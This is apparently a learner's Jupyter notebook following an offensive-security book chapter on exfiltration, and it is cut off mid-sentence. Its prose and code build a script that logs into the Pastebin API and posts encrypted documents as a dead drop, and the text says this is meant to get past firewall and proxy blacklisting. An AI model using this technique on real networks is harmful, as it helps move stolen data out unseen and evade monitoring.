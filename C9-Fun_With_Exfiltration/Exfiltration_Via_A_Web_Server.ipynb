{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN/LIT0bq9wPku9uoci8/CI",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C9-Fun_With_Exfiltration/Exfiltration_Via_A_Web_Server.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Exfiltration via a Web Server__*\n",
        "\n",
        "Next, we'll write a new file, __paste_exfil.py__, to send our encrypted information by posting to a web server. We'll automate the process of posting the encrypted document to an account on https://pastebin.com/. This will enable us to dead-drop the document and retrieve it when we want to without any-one else being able to decrypt it. By using a well-known site like __Pastebin__, we should also be able to bypass any blacklisting that a firewall or proxy may have, which might otherwise prevent us from just sending the document to an IP address or web server that we control. Let's start by putting some supporting functions into our exfiltration scirpt. Open up __paste_exfil.py__ and enter the following code:"
      ],
      "metadata": {
        "id": "ooouUvOkkOKN"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from win32com import client #1\n",
        "\n",
        "import os\n",
        "import random\n",
        "import requests #2\n",
        "import time\n",
        "\n",
        "username = 'tim' #3\n",
        "password = 'seKret'\n",
        "api_dev_key = 'cd3xxx001xxxx02'"
      ],
      "metadata": {
        "id": "k6ykzMUklKFg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We import __requests__ to handle the platform-independent function __[2]__, and we'll use __win32com__'s client class for the Windows-specific function __[1]__. We'll authenticate to the https://pastebin.com/ web server and upload the encrypted string. In order to authenticate, we define the __username__ and __password__ and the __api_dev_key__ __[3]__.\n",
        "\n",
        "Now that we've defined our imports and settings, let's write the platform-independent function __plain_paste__:"
      ],
      "metadata": {
        "id": "6WmGlAvQlat0"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def plain_paste(title, contents): #1\n",
        "    login_url = 'https://pastebin.com/api/api_login.php'\n",
        "    login_data = { #2\n",
        "        'api_dev_key': api_dev_key,\n",
        "        'api_user_name': username,\n",
        "        'api_user_password': password,\n",
        "    }\n",
        "    r = requests.post(login_url, data=login_data)\n",
        "    api_user_key = r.text #3\n",
        "\n",
        "    paste_url = 'https://pastebin.com/api/api_post.php' #4\n",
        "    paste_data = {\n",
        "        'api_paste_name': title,\n",
        "        'api_paste_code': contents.decode(),\n",
        "        'api_dev_key': api_dev_key,\n",
        "        'api_user_key': api_user_key,\n",
        "        'api_option': 'paste',\n",
        "        'api_paste_private': 0,\n",
        "    }\n",
        "    r = requests.post(paste_url, data=paste_data) #5\n",
        "    print(r.status_code)\n",
        "    print(r.text)"
      ],
      "metadata": {
        "id": "DxqixX4JnNvw"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Like the preceding email functions, the __plain_paste__ function receives the filename for a title and encrypted contents as arguments __[1]__. You need to make two requests in order to create the paste under your own username. First, make a post to the __login API__, specifying your __username__, __api_dev_key__, and __password__ __[2]__. The response from that post is your __api_user_key__. That bit of data is what you need to create a pastte under your own username __[3]__. The second request is to the __post API__ __[4]__. Send it the name of your paste (the filename is our title) and the contents, along with your __user__ and __dev__"
      ],
      "metadata": {
        "id": "s4_7XOv0odGw"
      }
    }
  ]
}